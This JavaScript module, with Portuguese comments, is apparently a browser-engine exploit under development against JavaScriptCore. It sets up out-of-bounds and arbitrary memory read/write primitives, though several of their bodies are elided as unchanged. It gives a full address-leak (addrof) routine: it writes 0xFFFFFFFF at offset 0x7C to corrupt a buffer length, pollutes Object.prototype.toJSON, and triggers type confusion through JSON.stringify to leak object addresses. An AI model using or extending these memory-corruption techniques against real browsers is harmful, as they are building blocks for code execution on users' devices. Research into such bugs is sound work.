// js/core_exploit.mjs (v31.R13 - Depuração da sonda interna de addrof)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs';
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false;

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; // Offset funcional para corromper m_length -> TC

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// Funções de gerenciamento OOB (sem alterações da v31.R12)
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) { /* ... */ 
    if (!isOOBEnvironmentSetup && !options.force_clear_even_if_not_setup) return;
    oob_array_buffer_real = null; oob_dataview_real = null; isOOBEnvironmentSetup = false;
}
export function getOOBAllocationSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.ALLOCATION_SIZE; }
export function getBaseOffsetInDV() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.BASE_OFFSET_IN_DV; }
export function getInitialBufferSize() { if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") updateOOBConfigFromUI(document); return OOB_CONFIG.INITIAL_BUFFER_SIZE; }
export async function triggerOOB_primitive(options = { force_reinit: false }) { /* ... (sem alterações da v31.R12) ... */ }
export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações da v31.R12) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações da v31.R12) ... */ }
export function isOOBReady() { /* ... (sem alterações da v31.R12) ... */ }
async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... (sem alterações da v31.R12) ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... (sem alterações da v31.R12) ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... (sem alterações da v31.R12) ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... (sem alterações da v31.R12) ... */ }

// Constantes HEISENBUG_*
const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; // 0x7C
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... (usa HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC) ... */ }

let _targetObjectForCoreAddrof_R13 = null; 
let _core_heisenbug_confirmed_by_probe_R13 = false;
let _core_victim_float_view_for_addrof_R13 = null; 
let _expected_m2_id_for_core_addrof_R13 = "core_addrof_m2_target_R13_unique"; // ID único

function _toJSONProbeForCoreAddrof_R13() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R13";
    let currentThisType = Object.prototype.toString.call(this);
    let isExpectedM2 = false;
    let hasExpectedId = false;

    if (this && typeof this.id_m2_probe === 'string') { // Verifica se a propriedade existe e é string
        hasExpectedId = (this.id_m2_probe === _expected_m2_id_for_core_addrof_R13);
    }
    isExpectedM2 = hasExpectedId; // A verificação de 'this' ser o objeto exato é difícil, confiamos no ID

    log(`[${FNAME_PROBE}] 'this' type: ${currentThisType}. Has ID prop: ${this ? this.hasOwnProperty('id_m2_probe') : 'N/A'}. ID val: ${this ? this.id_m2_probe : 'N/A'}. Expected ID: ${_expected_m2_id_for_core_addrof_R13}. Matches ID? ${hasExpectedId}`, "leak");

    if (isExpectedM2 && currentThisType === '[object Object]') { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para core_m2_victim (ID correspondente)! Escrevendo targetObject...`, "vuln");
        _core_heisenbug_confirmed_by_probe_R13 = true;
        if (_targetObjectForCoreAddrof_R13 && _core_victim_float_view_for_addrof_R13) {
            try {
                _core_victim_float_view_for_addrof_R13[0] = _targetObjectForCoreAddrof_R13;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R13[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
            }
        } else { log(`[${FNAME_PROBE}] AVISO: targetObject ou float_view não definidos na sonda.`, "warn"); }
    } else if (isExpectedM2) { // Tem o ID mas não é [object Object]
        log(`[${FNAME_PROBE}] 'this' é core_m2_victim (ID correspondente), mas tipo é ${currentThisType}. TC falhou.`, "warn");
    }
    return { core_addrof_probe_r13_executed: true, type_seen: currentThisType, id_seen: (this ? this.id_m2_probe : null) };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R13
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R13";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R13...`, "info");

    _targetObjectForCoreAddrof_R13 = targetObject; 
    _core_heisenbug_confirmed_by_probe_R13 = false; 
    _core_victim_float_view_for_addrof_R13 = null;
    // _expected_m2_id_for_core_addrof_R13 já é definido no escopo do módulo

    let addrof_result = { success: false, message: "Addrof (Heisenbug R13) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R13 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R13 = false;

    try {
        await triggerOOB_primitive({ force_reinit: true }); 
        if (!isOOBReady()) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof R13."); }

        log(`[${FNAME_FUNC}] Escrevendo valor crítico ${toHexHelper(HEISENBUG_CRITICAL_WRITE_VALUE)} em ${toHexHelper(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC)} para induzir TC.`, "warn");
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(150); 

        let core_victim_buffer = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R13 = new Float64Array(core_victim_buffer);
        _core_victim_float_view_for_addrof_R13.fill(0.987654321); 
        log(`[${FNAME_FUNC}] core_victim_buffer e float_view criados.`, "info");

        let core_m2_victim_local = { 
            id_m2_probe: _expected_m2_id_for_core_addrof_R13, // Usa o ID esperado
            writer_view_ref: _core_victim_float_view_for_addrof_R13 
        };
        let core_m1_victim = { 
            id_m1: "core_addrof_m1_container_R13", 
            payload_m2: core_m2_victim_local 
        };
        log(`[${FNAME_FUNC}] Estrutura core_m1/m2_victim criada. Alvo do stringify: core_m1_victim.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R13, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R13 = true;
        
        JSON.stringify(core_m1_victim); 
        log(`[${FNAME_FUNC}] JSON.stringify(core_m1_victim) concluído. _core_heisenbug_confirmed_by_probe_R13: ${_core_heisenbug_confirmed_by_probe_R13}`, "info");
        
        if (_core_heisenbug_confirmed_by_probe_R13) {
            const val_double = _core_victim_float_view_for_addrof_R13[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA confirmada! Lido de float_view[0]: Double=${val_double}, Int64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.987654321 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high();
                const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) {
                    addrof_result.success = true;
                    addrof_result.message = `Addrof (Heisenbug R13) TC interna OK. Endereço potencial: ${leaked_addr64.toString(true)}`;
                } else { addrof_result.message = `Heisenbug TC interna OK, mas valor ${leaked_addr64.toString(true)} é NaN/Infinity.`;}
            } else { addrof_result.message = `Heisenbug TC interna OK, mas valor lido (${leaked_addr64.toString(true)}) é o de preenchimento ou zero.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada pela sonda _toJSONProbeForCoreAddrof_R13."; }
    } catch (e) { addrof_result.message = `Erro crítico em Addrof R13: ${e.message || String(e)}`; } 
    finally {
        if (pollutedByCore_R13) { if (originalToJSON_R13) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R13); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R13 = null; _core_victim_float_view_for_addrof_R13 = null; 
    }
    log(`[${FNAME_FUNC}] Retornando resultado: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

export async function getStableConfusedArrayBuffer() { /* ... (sem alterações da v31.R12) ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... (sem alterações da v31.R12) ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... (sem alterações da v31.R12) ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... (sem alterações da v31.R12) ... */ }
